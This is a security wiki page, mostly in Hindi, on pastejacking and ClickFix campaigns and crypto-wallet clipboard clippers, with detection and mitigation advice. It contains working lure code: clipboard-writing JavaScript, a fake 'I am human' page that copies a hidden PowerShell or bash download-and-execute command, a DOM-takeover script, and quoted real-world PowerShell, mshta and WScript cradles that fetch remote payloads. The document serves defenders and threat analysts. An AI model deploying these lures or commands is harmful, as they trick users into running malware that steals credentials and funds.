# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "ऐसी कोई चीज़ paste न करें जिसे आपने स्वयं copy नहीं किया है।" – पुरानी लेकिन अभी भी मान्य सलाह

## Overview

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि users अक्सर commands को inspect किए बिना copy-and-paste कर देते हैं। एक malicious web page (या कोई भी JavaScript-capable context, जैसे Electron या Desktop application) प्रोग्राम के माध्यम से attacker-controlled text को system clipboard में डालता है। Victims को आमतौर पर carefully crafted social-engineering instructions के माध्यम से **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाने या terminal खोलकर clipboard content को *paste* करने के लिए प्रेरित किया जाता है, जिससे arbitrary commands तुरंत execute हो जाते हैं।

क्योंकि **कोई file download नहीं होती और कोई attachment open नहीं किया जाता**, इसलिए यह technique अधिकांश e-mail और web-content security controls को bypass कर देती है, जो attachments, macros या direct command execution को monitor करते हैं। इस कारण यह attack NetSupport RAT, Latrodectus loader या Lumma Stealer जैसे commodity malware families को deliver करने वाली phishing campaigns में लोकप्रिय है।<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

एक अन्य **clipboard hijacking** variant commands को बिल्कुल paste नहीं करता: यह तब तक wait करता है जब तक victim कोई **cryptocurrency wallet address** copy नहीं करता, फिर paste से ठीक पहले उसे चुपचाप attacker-controlled address से बदल देता है। यह लंबे wallet formats के विरुद्ध विशेष रूप से effective है, क्योंकि users अक्सर केवल पहले/अंतिम characters verify करते हैं।<sup>[[8]](#references)</sup>

Common real-world traits:
- **Thin loader + nested payload**: दिखाई देने वाला app/exe एक legitimate trading या "profit" tool जैसा दिखता है, जबकि real clipper bundle के अंदर अधिक गहराई में छिपा होता है (उदाहरण के लिए एक .NET loader, nested Rust payload को launch करता है)।
- **Regex-driven replacement**: malware `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, या generic **44-character Solana-like** strings जैसे strings को match करता है और उन्हें attacker wallets से rewrite करता है।
- **Wallet rotation at scale**: modern Windows samples प्रत्येक currency के लिए एक single static address के बजाय replacement wallets की **thousands** संख्या embed कर सकते हैं, जिससे प्रत्येक theft के बाद wallet reputation burn कम होता है।<sup>[[8]](#references)</sup>

### Windows clipper flow

एक common implementation एक hidden window होता है, जो **`AddClipboardFormatListener`** के साथ registered होता है। प्रत्येक clipboard update पर malware आमतौर पर निम्न calls करता है:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → current clipboard data तक access प्राप्त करता है।
- **`GetClipboardData`** → text पढ़ता है।
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string को attacker value से replace करता है।

Minimal hunting regexes अक्सर clippers में देखे जाते हैं:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Impact के लिए User-level persistence पर्याप्त है। देखा गया एक pattern इस प्रकार है:<sup>[[8]](#references)</sup>
- Payload को **`%APPDATA%\silke\silke.exe`** में कॉपी करना
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` के अंतर्गत एक **Startup-folder LNK** बनाना

Detection ideas:
- ऐसे Processes जो लगातार clipboard APIs को call करते हों और साथ ही `%APPDATA%` तथा user **Startup** folder में लिखते हों।
- नए LNK/executable का creation, जिसके बाद wallet-address clipboard rewrites हों।
- ऐसे Archives या fake-software bundles जिनमें कई unused files और एक छोटा launcher हो, जो nested binary को start करता हो।

### macOS में social-engineered quarantine removal + LaunchAgent persistence

macOS पर कुछ campaigns एक **`unlocker.command`** helper भेजती हैं और victim को निर्देश देती हैं कि यदि Gatekeeper app को damaged या unidentified developer से आया हुआ बताए, तो उस पर right-click → **Open** करें। Script केवल quarantine हटाती है और पास के `.app` को launch करती है:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
यह **Gatekeeper exploit** नहीं है; यह एक **social-engineered quarantine bypass** है, जो इस तथ्य का दुरुपयोग करता है कि Gatekeeper के निर्णय `com.apple.quarantine` xattr पर निर्भर करते हैं।<sup>[[8]](#references)</sup>

Execution के बाद, clipper current user के रूप में इस प्रकार persist कर सकता है:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` और `KeepAlive` वाला LaunchAgent

एक उपयोगी defensive detail यह है कि कुछ samples **self-healing watchdog** लागू करते हैं, जो लगभग हर 30 सेकंड में LaunchAgent और wrapper को दोबारा लिखता है। यदि आप running process को kill किए बिना पहले plist हटाते हैं, तो malware उसे तुरंत फिर से बना सकता है।<sup>[[8]](#references)</sup> Safe cleanup order:
1. Active clipper process को kill करें।
2. LaunchAgent plist को unload/delete करें।
3. `~/launch.sh` और copied payload को delete करें।

### Delivery note: fake reputation as a force multiplier

इस family के लिए malware स्वयं technically simple रह सकता है, जबकि **distribution layer** अधिकांश काम करती है: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views और benign-looking VirusTotal comments/votes का उपयोग binary को execution से पहले trustworthy दिखाने के लिए किया जाता है।<sup>[[8]](#references)</sup>

## Forced copy buttons and hidden payloads (macOS one-liners)

कुछ macOS infostealers installer sites (जैसे Homebrew) को clone करते हैं और **“Copy” button के उपयोग को force करते हैं**, ताकि users केवल visible text को highlight न कर सकें। Clipboard entry में expected installer command के साथ appended Base64 payload होता है (जैसे `...; echo <b64> | base64 -d | sh`), इसलिए एक single paste दोनों को execute करता है, जबकि UI extra stage को छिपा देता है।<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
पुराने campaigns में `document.execCommand('copy')` का उपयोग किया जाता था, जबकि नए campaigns asynchronous **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करते हैं।<sup>[[2]](#references)</sup>

## ClickFix / ClearFake फ्लो

1. User typosquatted या compromised site (जैसे `docusign.sa[.]com`) पर जाता है।
2. Injected **ClearFake** JavaScript एक `unsecuredCopyToClipboard()` helper को call करता है, जो चुपचाप एक Base64-encoded PowerShell one-liner को clipboard में store कर देता है।
3. HTML instructions victim से कहती हैं: *“**Win + R** दबाएं, command paste करें और issue resolve करने के लिए Enter दबाएं।”*
4. `powershell.exe` execute होता है और एक archive download करता है, जिसमें एक legitimate executable और एक malicious DLL होती है (classic DLL sideloading)।
5. Loader additional stages को decrypt करता है, shellcode inject करता है और persistence install करता है (जैसे scheduled task) – अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।<sup>[[1]](#references)</sup>

### उदाहरण: NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) अपनी directory में `msvcp140.dll` खोजता है।
* malicious DLL **GetProcAddress** के साथ APIs को dynamically resolve करता है, **curl.exe** के जरिए दो binaries (`data_3.bin`, `data_4.bin`) download करता है, उन्हें rolling XOR key `"https://google.com/"` का उपयोग करके decrypt करता है, final shellcode inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में unzip करता है।<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** के साथ `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader को execute करता है
3. MSI payload fetch करता है → signed application के अलावा `libcef.dll` drop करता है → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA के माध्यम से Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** call एक hidden PowerShell script लॉन्च करता है, जो `PartyContinued.exe` प्राप्त करता है, `Boat.pst` (CAB) को extract करता है, `extrac32` और file concatenation के माध्यम से `AutoIt3.exe` को reconstruct करता है और अंत में एक `.a3x` script चलाता है, जो browser credentials को `sumeriavgv.digital` पर exfiltrate करता है।<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix campaigns file downloads को पूरी तरह छोड़ देती हैं और victims को एक one-liner paste करने का निर्देश देती हैं, जो WSH के माध्यम से JavaScript को fetch और execute करता है, उसे persist करता है और C2 को प्रतिदिन rotate करता है। Observed chain का उदाहरण:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- Casual inspection को विफल करने के लिए runtime पर Obfuscated URL को reverse किया जाता है।
- JavaScript स्वयं को Startup LNK (WScript/CScript) के माध्यम से persist करता है और current day के आधार पर C2 चुनता है—जिससे domain rotation तेज़ी से संभव होती है।<sup>[[3]](#references)</sup>

Date के आधार पर C2s को rotate करने के लिए उपयोग किया गया Minimal JS fragment:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
अगला stage आम तौर पर एक loader deploy करता है, जो persistence स्थापित करता है और एक RAT (जैसे, PureHVNC) लाता है, अक्सर TLS को hardcoded certificate से pin करता है और traffic को chunks में विभाजित करता है।<sup>[[3]](#references)</sup>

इस variant के लिए विशेष Detection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (या `cscript.exe`)।
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` में LNK, जो `%TEMP%`/`%APPDATA%` के अंतर्गत JS path के साथ WScript/CScript invoke करता है।
- Registry/RunMRU और command-line telemetry में `.split('').reverse().join('')` या `eval(a.responseText)` शामिल होना।
- लंबे command lines के बिना long scripts feed करने के लिए बड़े stdin payloads के साथ बार-बार `powershell -NoProfile -NonInteractive -Command -` चलना।
- Scheduled Tasks, जो बाद में `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` जैसे LOLBins को updater-जैसे task/path के अंतर्गत execute करते हैं (जैसे, `\GoogleSystem\GoogleUpdater`)।

Threat hunting
- Daily-rotating C2 hostnames और URLs, जिनमें `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern हो।
- Clipboard write events को Win+R paste और उसके तुरंत बाद `powershell.exe` execution के साथ correlate करें।

Blue-teams clipboard, process-creation और registry telemetry को मिलाकर pastejacking abuse का सटीक पता लगा सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** commands का history रखता है — असामान्य Base64 / obfuscated entries खोजें।
* Security Event ID **4688** (Process Creation), जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } में हो।
* Event ID **4663**, suspicious 4688 event से ठीक पहले `%LocalAppData%\Microsoft\Windows\WinX\` या temporary folders के अंतर्गत file creations के लिए।
* EDR clipboard sensors (यदि उपलब्ध हों) — `Clipboard Write` के तुरंत बाद नए PowerShell process के साथ correlate करें।

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

हालिया campaigns नकली CDN/browser verification pages ("Just a moment…", IUAM-style) का बड़े पैमाने पर production करते हैं, जो users को अपने clipboard से OS-specific commands को native consoles में copy करने के लिए बाध्य करते हैं। इससे execution browser sandbox से बाहर चला जाता है और Windows तथा macOS दोनों पर काम करता है।<sup>[[4]](#references)</sup>

Builder-generated pages की प्रमुख विशेषताएँ
- Payloads को अनुकूलित करने के लिए `navigator.userAgent` के माध्यम से OS detection (Windows PowerShell/CMD बनाम macOS Terminal)। Illusion बनाए रखने के लिए unsupported OS के लिए optional decoys/no-ops।
- Benign UI actions (checkbox/Copy) पर automatic clipboard-copy, जबकि visible text clipboard content से अलग हो सकता है।
- Mobile blocking और step-by-step instructions वाला popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter।
- Tailwind-styled verification UI के साथ compromised site के DOM को overwrite करने वाला optional obfuscation और single-file injector (नए domain registration की आवश्यकता नहीं)।<sup>[[4]](#references)</sup>

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS के initial run की persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` का उपयोग करें ताकि terminal बंद होने के बाद भी execution जारी रहे और दिखाई देने वाले artifacts कम हों।<sup>[[4]](#references)</sup>

compromised sites पर in-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lures के लिए विशिष्ट Detection और hunting ideas
- Web: वे Pages जो verification widgets से Clipboard API को bind करते हैं; displayed text और clipboard payload के बीच mismatch; `navigator.userAgent` branching; suspicious contexts में Tailwind + single-page replace.
- Windows endpoint: browser interaction के तुरंत बाद `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` से batch/MSI installers का execution.
- macOS endpoint: browser events के आसपास Terminal/iTerm द्वारा `bash`/`curl`/`base64 -d` को spawn करना; terminal close होने के बाद भी background jobs का जारी रहना।
- `RunMRU` Win+R history और clipboard writes को subsequent console process creation के साथ correlate करें।

Supporting techniques के लिए यह भी देखें

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake WordPress sites को compromise करना और loader JavaScript inject करना जारी रखता है, जो external hosts (Cloudflare Workers, GitHub/jsDelivr) तथा blockchain “etherhiding” calls (जैसे Binance Smart Chain API endpoints, जैसे `bsc-testnet.drpc[.]org`, पर POSTs) को chain करके current lure logic प्राप्त करता है। हालिया overlays में fake CAPTCHAs का व्यापक उपयोग होता है, जो users को कुछ भी download करने के बजाय one-liner (T1204.004) को copy/paste करने का निर्देश देते हैं।<sup>[[6]](#references)</sup>
- Initial execution को signed script hosts/LOLBAS को तेजी से delegate किया जा रहा है। January 2026 chains में earlier `mshta` usage को built-in `SyncAppvPublishingServer.vbs` से बदला गया, जिसे `WScript.exe` के माध्यम से execute किया जाता है और remote content fetch करने के लिए PowerShell-like arguments के साथ aliases/wildcards pass किए जाते हैं:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` signed है और सामान्यतः App-V द्वारा उपयोग किया जाता है; `WScript.exe` और असामान्य arguments (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) के साथ जोड़े जाने पर यह ClearFake के लिए एक high-signal LOLBAS stage बन जाता है।<sup>[[6]](#references)</sup>
- फरवरी 2026 में fake CAPTCHA payloads फिर से pure PowerShell download cradles पर shift हो गए। दो live examples:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- पहली chain एक in-memory `iex(irm ...)` grabber है; दूसरी `WinHttp.WinHttpRequest.5.1` के माध्यम से stage करती है, एक अस्थायी `.ps1` लिखती है, फिर hidden window में `-ep bypass` के साथ launch करती है।<sup>[[6]](#references)</sup>

इन variants के लिए Detection/hunting tips
- Process lineage: clipboard writes/Win+R के तुरंत बाद browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` या PowerShell cradles।
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, या raw IP `iex(irm ...)` patterns।
- Network: web browsing के तुरंत बाद script hosts/PowerShell से CDN worker hosts या blockchain RPC endpoints पर outbound requests।
- File/registry: `%TEMP%` के अंतर्गत temporary `.ps1` creation और इन one-liners वाले RunMRU entries; external URLs या obfuscated alias strings के साथ signed-script LOLBAS (WScript/cscript/mshta) के execution पर block/alert करें।

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments और LOLBin chaining

हालिया Red Canary telemetry दिखाती है कि स्थिर indicator **एक exact command नहीं**, बल्कि **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** और **immediate execution** का संयोजन है।<sup>[[7]](#references)</sup>

### उल्लेखनीय operator patterns

- **Paste confirmation telemetry**: कुछ payloads real stage से पहले `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` call करते हैं। इससे window को छोटा और शांत रखते हुए user interaction की पुष्टि होती है।
- **Fake verification comments**: PowerShell one-liners में `# Security check ✔️ I'm not a robot Verification ID: 138105` जैसी strings जोड़ी जा सकती हैं, ताकि command को Run / `cmd.exe` / PowerShell history में paste किए जाने के बाद भी CAPTCHA-related समझा जाए।
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` command line में static URL से बचता है, जबकि in-memory download-and-execute करता रहता है।
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` unusual casing और flags में Unicode-like characters का दुरुपयोग करता है, ताकि brittle detections को bypass किया जा सके और फिर भी `msiexec.exe` जैसा दिखाई दे।
- **Caret-escaped LOLBin chains**: `cmd.exe` `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`) के साथ keywords छिपा सकता है, nested shell को minimized mode में start कर सकता है, attacker content को `.pdf` जैसे benign extension के साथ save कर सकता है, और फिर उसे `mshta` के माध्यम से execute कर सकता है।<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) disable करें या user gesture अनिवार्य करें।
2. Security awareness – users को sensitive commands *type* करना या पहले उन्हें text editor में paste करना सिखाएँ।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control का उपयोग करके arbitrary one-liners को block करें।
4. Network controls – ज्ञात pastejacking और malware C2 domains पर outbound requests block करें।

## Related Tricks

* **Discord Invite Hijacking** अक्सर users को malicious server में लुभाने के बाद इसी ClickFix approach का दुरुपयोग करता है:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
